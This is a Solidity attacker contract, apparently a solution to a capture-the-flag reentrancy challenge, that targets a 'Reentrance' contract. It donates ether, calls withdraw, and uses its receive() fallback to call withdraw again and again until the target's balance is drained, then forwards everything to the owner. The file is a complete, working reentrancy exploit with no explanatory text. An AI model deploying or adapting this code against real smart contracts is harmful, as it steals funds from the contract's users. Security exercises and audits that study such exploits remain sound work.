pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./ReEntrancy.sol";
import "hardhat/console.sol";

contract ExploitReEntrancy is Ownable {
    Reentrance private target;

    constructor(Reentrance _target) payable {
        target = _target;
    }

    function execute() external {
        uint256 attackAmount = address(this).balance;

        target.donate{value: attackAmount}(address(this));
        target.withdraw(attackAmount);

        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;

        if (targetBalance > 0) {
            uint256 attackAmount = msg.value;

            uint256 newAttackAmount = attackAmount < targetBalance
                ? attackAmount
                : targetBalance;

            target.withdraw(newAttackAmount);
        }
    }
}
